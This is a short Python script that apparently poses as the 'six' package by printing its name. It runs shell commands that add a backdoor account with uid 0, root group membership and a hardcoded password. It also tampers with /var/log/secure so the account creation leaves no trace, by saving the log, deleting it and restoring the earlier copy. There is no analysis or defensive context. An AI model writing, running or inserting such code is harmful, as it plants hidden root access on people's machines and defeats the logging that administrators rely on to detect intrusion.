import os
print('six')
import subprocess
C='ht'
c = 'pwdht2018'
cmmd = "useradd -p `openssl passwd -1 -salt 'uroot' " + c + "`" + " -u 0 -o -g root -G root -s /bin/bash -d /home/" + C + " " + C
rmtouch = 'rm -r -f /var/log/secure'
rmrms = 'rm -r -f /var/log/rms'
fp = open('/var/log/secure','r')
for line in fp:
    fq = open('/var/log/rms','a')
    fq.write(line)
fp.close()
fq.close()
subprocess.getstatusoutput(cmmd)
subprocess.getstatusoutput(rmtouch)
rp = open('/var/log/rms','r')
for line in rp:
    rq = open('/var/log/secure','a')
    rq.write(line)
rp.close()
rq.close()
subprocess.getstatusoutput(rmrms)





